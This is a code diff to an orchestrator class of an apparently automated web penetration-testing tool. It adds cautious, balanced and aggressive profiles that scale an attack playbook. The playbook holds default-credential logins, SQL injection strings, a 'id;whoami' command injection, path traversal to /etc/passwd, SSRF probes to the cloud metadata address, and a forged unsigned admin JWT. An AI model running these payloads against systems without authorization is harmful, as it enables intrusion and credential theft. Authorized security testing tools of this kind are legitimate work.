@@ -65,6 +65,21 @@ class Orchestrator:
             "settings": self.settings,
         }
 
+    def _web_profile_settings(self) -> Dict[str, Any]:
+        web = self.settings.get("web", {}) if isinstance(self.settings, dict) else {}
+        profile = str(web.get("profile", "balanced")).strip().lower()
+        if profile not in {"cautious", "balanced", "aggressive"}:
+            profile = "balanced"
+        route_budget = int(web.get("route_budget", 2 if profile == "balanced" else (1 if profile == "cautious" else 3)))
+        login_attempts = int(web.get("login_attempts", 2 if profile == "balanced" else (1 if profile == "cautious" else 4)))
+        browser_enabled = bool(web.get("browser_enabled", True))
+        return {
+            "profile": profile,
+            "route_budget": max(1, min(route_budget, 6)),
+            "login_attempts": max(0, min(login_attempts, 6)),
+            "browser_enabled": browser_enabled,
+        }
+
     def _load_state(self) -> Dict[str, Any]:
         return self.data_store.load_state()
 
@@ -337,7 +352,7 @@ class Orchestrator:
         if tool_name == "web_interact":
             normalized.setdefault("target", base_url)
             if self.mode == "webapp":
-                normalized.setdefault("browser", True)
+                normalized.setdefault("browser", self._web_profile_settings().get("browser_enabled", True))
             normalized = self._normalize_web_interact_params(normalized, base_url)
         if tool_name == "websocket_interact":
             normalized.setdefault("target", target_host)
@@ -770,6 +785,10 @@ class Orchestrator:
 
     def _webapp_playbook(self, base_url: str, ws_target: str):
         forged_admin = self._build_unsigned_jwt({"role": "admin", "user": "admin"})
+        profile = self._web_profile_settings()
+        route_budget = profile["route_budget"]
+        login_attempts = profile["login_attempts"]
+        browser_enabled = profile["browser_enabled"]
         routes = self._candidate_web_paths()
         common_auth_paths = ["/login", "/signin", "/auth/login", "/users/sign_in"]
         common_search_paths = ["/search", "/find", "/query"]
@@ -788,6 +807,13 @@ class Orchestrator:
             ("test", {"username": "test", "password": "test"}),
             ("admin", {"username": "admin", "password": "admin"}),
         ]
+        if profile["profile"] == "aggressive":
+            credential_sets.extend([
+                ("root", {"username": "root", "password": "root"}),
+                ("dev", {"username": "dev", "password": "dev"}),
+            ])
+        elif profile["profile"] == "cautious":
+            credential_sets = credential_sets[:1]
 
         def choose_paths(predicate, defaults):
             matches = [path for path in routes if predicate(path)]
@@ -850,68 +876,86 @@ class Orchestrator:
         )
 
         playbook = [
-            {"type": "tool", "tool": "web_interact", "params": {"target": base_url, "path": "/", "method": "GET", "browser": True}},
+            {"type": "tool", "tool": "web_interact", "params": {"target": base_url, "path": "/", "method": "GET", "browser": browser_enabled}},
         ]
 
-        for path in auth_paths[:2]:
-            playbook.append({"type": "tool", "tool": "web_interact", "params": {"target": base_url, "path": path, "method": "GET", "browser": True}})
-            for session_name, creds in credential_sets:
+        for path in auth_paths[:route_budget]:
+            playbook.append({"type": "tool", "tool": "web_interact", "params": {"target": base_url, "path": path, "method": "GET", "browser": browser_enabled}})
+            for session_name, creds in credential_sets[:login_attempts]:
                 playbook.append({
                     "type": "tool",
                     "tool": "web_interact",
                     "params": {"target": base_url, "path": path, "method": "POST", "payload": creds, "session_name": session_name},
                 })
 
-        for path in search_paths[:2]:
+        for path in search_paths[:route_budget]:
             playbook.append({
                 "type": "tool",
                 "tool": "web_interact",
-                "params": {"target": base_url, "path": path, "method": "GET", "payload": {"q": "' UNION SELECT 1,2,3--"}, "browser": True},
+                "params": {"target": base_url, "path": path, "method": "GET", "payload": {"q": "' UNION SELECT 1,2,3--"}, "browser": browser_enabled},
             })
+            if profile["profile"] == "aggressive":
+                playbook.append({
+                    "type": "tool",
+                    "tool": "web_interact",
+                    "params": {"target": base_url, "path": path, "method": "GET", "payload": {"q": "\" OR 1=1--"}, "browser": browser_enabled},
+                })
 
-        for path in object_paths[:2]:
+        for path in object_paths[:route_budget]:
             playbook.append({
                 "type": "tool",
                 "tool": "web_interact",
-                "params": {"target": base_url, "path": path, "method": "GET", "payload": {"id": "2"}, "browser": True},
+                "params": {"target": base_url, "path": path, "method": "GET", "payload": {"id": "2"}, "browser": browser_enabled},
             })
+            if profile["profile"] == "aggressive":
+                playbook.append({
+                    "type": "tool",
+                    "tool": "web_interact",
+                    "params": {"target": base_url, "path": path, "method": "GET", "payload": {"id": "999"}, "browser": browser_enabled},
+                })
 
-        for path in content_paths[:2]:
-            playbook.append({"type": "tool", "tool": "web_interact", "params": {"target": base_url, "path": path, "method": "GET", "browser": True}})
+        for path in content_paths[:route_budget]:
+            playbook.append({"type": "tool", "tool": "web_interact", "params": {"target": base_url, "path": path, "method": "GET", "browser": browser_enabled}})
 
-        for path in ssrf_paths[:2]:
+        for path in ssrf_paths[:route_budget]:
             playbook.append({
                 "type": "tool",
                 "tool": "web_interact",
                 "params": {"target": base_url, "path": path, "method": "GET", "payload": {"url": "http://127.0.0.1:80"}, "session_name": "user"},
             })
+            if profile["profile"] == "aggressive":
+                playbook.append({
+                    "type": "tool",
+                    "tool": "web_interact",
+                    "params": {"target": base_url, "path": path, "method": "GET", "payload": {"url": "http://169.254.169.254/latest/meta-data/"}, "session_name": "user"},
+                })
 
-        for path in cmd_paths[:2]:
+        for path in cmd_paths[:route_budget]:
             playbook.append({
                 "type": "tool",
                 "tool": "web_interact",
                 "params": {"target": base_url, "path": path, "method": "GET", "payload": {"cmd": "id;whoami"}, "session_name": "user"},
             })
 
-        for path in download_paths[:2]:
+        for path in download_paths[:route_budget]:
             playbook.append({
                 "type": "tool",
                 "tool": "web_interact",
                 "params": {"target": base_url, "path": path, "method": "GET", "payload": {"file": "../../../../etc/passwd"}, "session_name": "user"},
             })
 
-        for path in token_paths[:2]:
+        for path in token_paths[:route_budget]:
             playbook.append({"type": "tool", "tool": "web_interact", "params": {"target": base_url, "path": path, "method": "GET", "session_name": "user"}})
 
-        for path in admin_paths[:2]:
-            playbook.append({"type": "tool", "tool": "web_interact", "params": {"target": base_url, "path": path, "method": "GET", "browser": True}})
+        for path in admin_paths[:route_budget]:
+            playbook.append({"type": "tool", "tool": "web_interact", "params": {"target": base_url, "path": path, "method": "GET", "browser": browser_enabled}})
             playbook.append({
                 "type": "tool",
                 "tool": "web_interact",
                 "params": {"target": base_url, "path": path, "method": "GET", "headers": {"Authorization": f"Bearer {forged_admin}"}},
             })
 
-        for path in upload_paths[:2]:
+        for path in upload_paths[:route_budget]:
             playbook.append({
                 "type": "tool",
                 "tool": "web_interact",
@@ -924,7 +968,7 @@ class Orchestrator:
                 },
             })
 
-        for path in template_paths[:2]:
+        for path in template_paths[:route_budget]:
             playbook.append({
                 "type": "tool",
                 "tool": "web_interact",
@@ -1022,6 +1066,20 @@ class Orchestrator:
         max_timeout = int(policy.get("max_tool_timeout_seconds", 300))
         tool_timeouts = policy.get("tool_timeouts", {})
         default_timeout = int(tool_timeouts.get(tool_name, max_timeout))
+        tooling_settings = self.settings.get("tooling", {}) if isinstance(self.settings, dict) else {}
+        profile = self._web_profile_settings() if self.mode == "webapp" else {"profile": "balanced"}
+        timeout_override = tooling_settings.get("timeout")
+        if timeout_override:
+            default_timeout = int(timeout_override)
+        if tool_name == "ffuf" and tooling_settings.get("ffuf_threads"):
+            constrained.setdefault("threads", int(tooling_settings["ffuf_threads"]))
+        if tool_name == "gobuster" and tooling_settings.get("gobuster_threads"):
+            constrained.setdefault("threads", int(tooling_settings["gobuster_threads"]))
+        if tool_name in {"ffuf", "gobuster"} and "threads" not in constrained:
+            if profile["profile"] == "aggressive":
+                constrained["threads"] = 60 if tool_name == "ffuf" else 20
+            elif profile["profile"] == "cautious":
+                constrained["threads"] = 15 if tool_name == "ffuf" else 5
         requested_timeout = int(constrained.get("timeout", default_timeout))
         constrained["timeout"] = max(1, min(requested_timeout, max_timeout))
         return constrained
